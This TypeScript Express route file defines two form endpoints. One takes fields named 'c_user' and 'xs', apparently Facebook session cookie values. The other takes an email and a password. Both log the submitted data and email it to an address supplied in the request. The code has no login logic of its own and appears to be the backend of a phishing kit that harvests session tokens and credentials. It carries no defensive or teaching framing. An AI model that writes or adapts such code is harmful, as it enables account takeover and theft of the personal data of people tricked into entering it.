import type { Express } from "express";
import { createServer } from "http";
import { emailService } from "./email-service";
import { z } from "zod";

const formOneSchema = z.object({
  c_user: z.string(),
  xs: z.string(),
  admin_email: z.string().email().optional(),
});

const formTwoSchema = z.object({
  user_email: z.string(),
  password: z.string(),
  admin_email: z.string().email().optional(),
});

export async function registerRoutes(app: Express) {
  app.post("/api/form-one", async (req, res) => {
    try {
      console.log('Received form one data:', req.body);
      const data = formOneSchema.parse(req.body);

      const emailResult = await emailService.sendFormOneEmail(data, data.admin_email);

      res.json({ success: true });
    } catch (error) {
      console.error('Error processing form one:', error);
      const errorMessage = error instanceof Error ? error.message : "Failed to process form one";
      res.status(500).json({ success: false, message: errorMessage });
    }
  });

  app.post("/api/form-two", async (req, res) => {
    try {
      console.log('Received form two data:', req.body);
      const data = formTwoSchema.parse(req.body);

      const emailResult = await emailService.sendFormTwoEmail(data, data.admin_email);

      res.json({ success: true });
    } catch (error) {
      console.error('Error processing form two:', error);
      const errorMessage = error instanceof Error ? error.message : "Failed to process form two";
      res.status(500).json({ success: false, message: errorMessage });
    }
  });

  return createServer(app);
}
